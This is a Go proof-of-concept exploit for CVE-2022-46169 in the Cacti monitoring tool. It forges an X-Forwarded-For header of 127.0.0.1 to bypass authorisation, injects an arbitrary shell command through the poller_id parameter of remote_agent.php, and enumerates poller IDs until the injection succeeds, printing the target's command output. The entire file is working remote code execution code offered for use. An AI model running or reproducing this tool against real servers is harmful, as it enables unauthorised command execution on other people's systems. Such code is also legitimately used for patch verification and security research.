package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

var (
	cactiUrl      urlFlag
	pollerId      int
	pollerIdStart int
	pollerIdEnd   int
	cmd           string
)

type urlFlag struct {
	url *url.URL
}

func (f *urlFlag) String() string {
	if f.url == nil {
		return ""
	}
	return f.url.String()
}

func (f *urlFlag) Set(value string) error {
	parsedUrl, err := url.ParseRequestURI(value)
	if err != nil {
		return fmt.Errorf("invalid URL: %v", value)
	}
	f.url = parsedUrl
	return nil
}

type notVulnerable struct{}

func (m *notVulnerable) Error() string {
	return "Not vulnerable"
}

func exploit(cactiUrl urlFlag, pollerId int, cmd string) (*http.Response, error) {
	values := url.Values{}
	values.Set("action", "polldata")
	values.Set("poller_id[]", strconv.Itoa(pollerId)+";"+cmd)

	client := &http.Client{}
	req, err := http.NewRequest("POST", cactiUrl.String()+"remote_agent.php", strings.NewReader(values.Encode()))
	if err != nil {
		return nil, err
	}

	req.Header.Set("X-Forwarded-For", "127.0.0.1")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}

	bodyBytes, _ := io.ReadAll(resp.Body)
	if strings.Contains(string(bodyBytes), "FATAL: You are not authorised") {
		return nil, &notVulnerable{}
	}

	return resp, nil
}

func enumerate(cactiUrl urlFlag, pollerIdStart int, pollerIdEnd int, cmd string) {
	for i := pollerIdStart; i <= pollerIdEnd; i++ {
		out, err := exploit(cactiUrl, i, cmd)

		if err == nil {
			fmt.Printf("[+] Poller ID %d is vulnerable \n", i)
			bodyBytes, _ := io.ReadAll(out.Body)
			fmt.Println(string(bodyBytes))
			out.Body.Close()
			break
		}
	}
}

func main() {
	println("[+] Starting poc exploit for CVE-2022-46169")

	flag.Var(&cactiUrl, "url", "Cacti instance URL")
	flag.IntVar(&pollerId, "id", 0, "Vulnerable poller_id")
	flag.IntVar(&pollerIdStart, "start", 1, "start pollerId for enumeration")
	flag.IntVar(&pollerIdEnd, "end", 100, "end pollerId for enumeration")
	flag.StringVar(&cmd, "cmd", "id", "command to run on target")
	flag.Parse()

	if pollerId != 0 {
		out, err := exploit(cactiUrl, pollerId, cmd)
		if (err == &notVulnerable{}) {
			fmt.Println("[-] Cacti instance seems not vulnerable. Or provided poller_id does not support action. In this case you could try to enumerate poller indexes")
		} else if err != nil {
			fmt.Println("[-] Unable to connect to Cacti instance. Probably invalid url")
		} else {
			bodyBytes, _ := io.ReadAll(out.Body)
			fmt.Printf("[+] Poller ID %d is vulnerable \n", pollerId)
			println("[+] Command executed")
			out.Body.Close()
		}
	} else {
		fmt.Println("[+] Starting poller_id enumeration")
		enumerate(cactiUrl, pollerIdStart, pollerIdEnd, cmd)
	}
	println("[+] Exiting...")
}
